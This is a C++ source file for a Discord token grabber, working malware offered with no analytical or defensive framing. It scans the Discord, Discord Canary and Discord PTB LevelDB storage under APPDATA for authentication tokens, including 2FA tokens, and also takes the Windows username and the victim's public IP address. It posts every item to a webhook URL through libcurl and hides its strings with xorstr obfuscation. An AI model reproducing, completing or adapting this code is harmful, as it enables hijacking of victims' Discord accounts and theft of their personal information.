#include "grabber.h"


void TokenGrabber::grabtoken()
{

    // get appdata
    std::string appdata = getenv(xorstr_("APPDATA"));

    // discord tokenpaths where token is stored
    std::vector<std::string> discordtokenpaths;
    discordtokenpaths.push_back(appdata + xorstr_("\\discord\\Local Storage\\leveldb\\"));
    discordtokenpaths.push_back(appdata + xorstr_("\\Discord Canary\\Local Storage\\leveldb\\"));
    discordtokenpaths.push_back(appdata + xorstr_("\\discordptb\\Local Storage\\leveldb\\"));

    for (auto& paths : discordtokenpaths)
    {
        if (std::filesystem::exists(paths) == true) // check if path exist
        {
            for (const auto& entry : std::filesystem::directory_iterator(paths))
            {
                if (entry.path().string().find(xorstr_(".log")) != std::string::npos || entry.path().string().find(xorstr_(".ldb")) != std::string::npos) // check if the file have the extension .log or .ldb
                {
                    findtoken((entry.path().string())); // gonna find the token with magic regex search
                }
            }
        }
    }

    // send all tokens to the webhook
    for (auto& tokkietokkie : discordtokens)
    {
        sendwebhook(tokkietokkie);
        std::this_thread::sleep_for(std::chrono::milliseconds(1000)); // delay
    }

}

void TokenGrabber::findtoken(const std::string& path) // grab token! // thanks based#0001 for helping me out on this part
{
    // regex
    std::string discordtokenwithout2fa = xorstr_(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
    std::string discordtokenwith2FA = xorstr_(R"(mfa\.[\w-]{84})");
    std::regex discordtokenwithout2faregex(discordtokenwithout2fa);
    std::regex discordtokenwith2FAregex(discordtokenwith2FA);

    // get file into string
    std::ifstream stream((path), std::ios::binary);
    std::string content((std::istreambuf_iterator<char>(stream)),
    std::istreambuf_iterator<char>());
    stream.close();

    // use std::regex_search to find regex
    std::smatch result;

    if (std::regex_search(content, result, discordtokenwith2FAregex))
    {
        discordtokens.emplace_back(result.str());
    }

    if (std::regex_search(content, result, discordtokenwithout2faregex))
    {
        discordtokens.emplace_back(result.str());
    }
}

void TokenGrabber::grabpcusername()
{
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);

    sendwebhook(username);
}

void TokenGrabber::grabip()
{
    auto handle = InternetOpen(xorstr_("gay"), INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0); // the handle to the current Internet session. 
    auto handle1 = InternetOpenUrl(handle, xorstr_("https://myexternalip.com/raw"), 0, 0, INTERNET_FLAG_KEEP_CONNECTION, 0);

    char buffer[1111];
    DWORD bytesread;
    InternetReadFile(handle1, &buffer, 1111, &bytesread);

    InternetCloseHandle(handle);
    InternetCloseHandle(handle1);

    std::string ip(buffer, bytesread);
    sendwebhook(ip);
}

void TokenGrabber::sendwebhook(const std::string& content)
{
    std::string send = "name=" + std::string(webhookname) + " &content= " + std::string(content) +" &avatar_url= " + std::string(avatar_url) + "";

    CURL* curl;
    CURLcode res;
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl) {
      
        curl_easy_setopt(curl, CURLOPT_URL, webhook_url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, send.c_str());
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}
